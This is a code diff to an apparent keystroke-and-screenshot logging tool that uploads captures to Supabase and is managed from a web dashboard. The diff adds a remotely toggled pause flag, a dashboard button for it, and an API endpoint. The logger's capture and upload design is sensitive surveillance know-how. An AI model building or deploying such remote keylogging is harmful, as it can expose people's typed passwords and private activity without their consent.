@@ -5,7 +5,7 @@ import socket
 import ctypes
 import threading
 import uuid
-from datetime import datetime
+from datetime import datetime, timezone
 
 # Try imports for headless server compatibility (Render)
 try:
@@ -55,16 +55,33 @@ def register_device():
         supabase.table("devices").upsert({
             "device_id": device_id,
             "nickname": hostname,
-            "last_active": "now()"
+            "last_active": datetime.now(timezone.utc).isoformat()
         }).execute()
         print(f"Device successfully registered/updated: {device_id} ({hostname})")
     except Exception as e:
         print(f"Failed to register/upsert device in Supabase: {e}")
 
+is_monitoring_disabled = False
+
+def check_disabled_status_loop():
+    global is_monitoring_disabled
+    if supabase is None:
+        return
+    device_id = get_device_id()
+    while True:
+        try:
+            res = supabase.table("devices").select("is_disabled").eq("device_id", device_id).execute()
+            if res.data:
+                is_monitoring_disabled = res.data[0].get("is_disabled", False)
+        except Exception as e:
+            print(f"Failed to check remote disabled status: {e}")
+        time.sleep(30)
+
 # Register local device on client startup (only if not running in SERVER_ONLY mode)
 server_only = os.getenv('SERVER_ONLY', 'false').lower() == 'true' or pynput is None
 if not server_only:
     register_device()
+    threading.Thread(target=check_disabled_status_loop, daemon=True).start()
 
 # Initialize logs and screenshots directories (kept for fallback / temp storage)
 os.makedirs("logs", exist_ok=True)
@@ -550,6 +567,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     <span style="color: var(--text-muted); font-size: 0.85rem; font-weight: 500;">Select Device:</span>
                     <select id="device-select" class="date-select" onchange="changeDevice(this.value)"></select>
                     <button onclick="promptRenameDevice()" style="background: none; border: none; color: var(--accent); font-size: 0.85rem; cursor: pointer; font-weight: 600; padding: 0 0.25rem;" title="Rename Device">Rename</button>
+                    <button id="toggle-monitor-btn" onclick="toggleDeviceMonitoring()" style="background: none; border: none; color: var(--accent); font-size: 0.85rem; cursor: pointer; font-weight: 600; padding: 0 0.25rem; margin-left: 0.25rem;" title="Pause/Resume Monitoring">Pause Logs</button>
                 </div>
                 <div class="date-selector-wrapper">
                     <span style="color: var(--text-muted); font-size: 0.85rem; font-weight: 500;">Select Date:</span>
@@ -618,6 +636,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         let selectedDate = '';
         let selectedSort = 'asc';
         let selectedDevice = '';
+        let allDevices = [];
         
         // Track selected items across updates
         let selectedLogKeys = new Set(); // format: "timestamp||text"
@@ -689,10 +708,54 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             fetchScreenshots();
         }
         
+        function updateMonitoringButton() {
+            const dev = allDevices.find(d => d.device_id === selectedDevice);
+            const btn = document.getElementById('toggle-monitor-btn');
+            if (!btn) return;
+            if (dev && dev.is_disabled) {
+                btn.innerText = "Resume Logs";
+                btn.style.color = "#ef4444"; // Red
+                btn.title = "Monitoring is currently paused. Click to resume.";
+            } else {
+                btn.innerText = "Pause Logs";
+                btn.style.color = "#3b82f6"; // Blue
+                btn.title = "Monitoring is active. Click to pause.";
+            }
+        }
+
+        async function toggleDeviceMonitoring() {
+            if (!selectedDevice) return;
+            const dev = allDevices.find(d => d.device_id === selectedDevice);
+            if (!dev) return;
+            const newStatus = !dev.is_disabled;
+            
+            const confirmMsg = newStatus 
+                ? "Are you sure you want to PAUSE monitoring on this device? The laptop will stop capturing keystrokes and screenshots." 
+                : "Are you sure you want to RESUME monitoring on this device?";
+                
+            if (!confirm(confirmMsg)) return;
+            
+            try {
+                const res = await fetch('/api/devices/toggle-monitoring', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ device_id: selectedDevice, is_disabled: newStatus })
+                });
+                if (res.ok) {
+                    await fetchDevices();
+                } else {
+                    alert("Failed to update monitoring status");
+                }
+            } catch (err) {
+                console.error("Error toggling monitoring:", err);
+            }
+        }
+
         async function fetchDevices() {
             try {
                 const res = await fetch('/api/devices');
                 const devices = await res.json();
+                allDevices = devices;
                 const select = document.getElementById('device-select');
                 
                 const prevSelection = select.value || selectedDevice;
@@ -713,6 +776,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                     }
                     select.value = selectedDevice;
                 }
+                updateMonitoringButton();
             } catch (err) {
                 console.error("Error fetching devices:", err);
             }
@@ -722,6 +786,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             selectedDevice = deviceId;
             selectedLogKeys.clear();
             selectedScreenshotFilenames.clear();
+            updateMonitoringButton();
             fetchDates().then(() => {
                 fetchLogs();
                 fetchScreenshots();
@@ -1213,6 +1278,23 @@ def rename_device():
             
     return jsonify({"error": "Supabase not connected"}), 400
 
+@app.route('/api/devices/toggle-monitoring', methods=['POST'])
+def toggle_device_monitoring():
+    data = request.json
+    device_id = data.get("device_id")
+    is_disabled = data.get("is_disabled")
+    if not device_id or is_disabled is None:
+        return jsonify({"error": "Device ID and is_disabled flag required"}), 400
+        
+    if supabase is not None:
+        try:
+            supabase.table("devices").update({"is_disabled": is_disabled}).eq("device_id", device_id).execute()
+            return jsonify({"status": "success"}), 200
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
+            
+    return jsonify({"error": "Supabase not connected"}), 400
+
 @app.route('/api/dates')
 def get_available_dates():
     dates = set()
@@ -1614,6 +1696,8 @@ def capture_and_upload_screenshot(prefix):
     Captures a screenshot, saves it locally as a temporary WebP, uploads it to Supabase Storage
     if configured, and returns (screenshot_url, screenshot_filename).
     """
+    if is_monitoring_disabled:
+        return None, None
     now = datetime.now()
     date_str = now.strftime("%Y-%m-%d")
     timestamp_file = now.strftime("%Y%m%d_%H%M%S_%f")
@@ -1664,6 +1748,8 @@ def capture_and_upload_screenshot(prefix):
     return screenshot_url, s3_path
 
 def write_log(timestamp, window_title, line_str, screenshot_url=None, screenshot_filename=None):
+    if is_monitoring_disabled:
+        return
     device_id = get_device_id()
     # 1. Database logging (if Supabase is initialized)
     if supabase is not None:
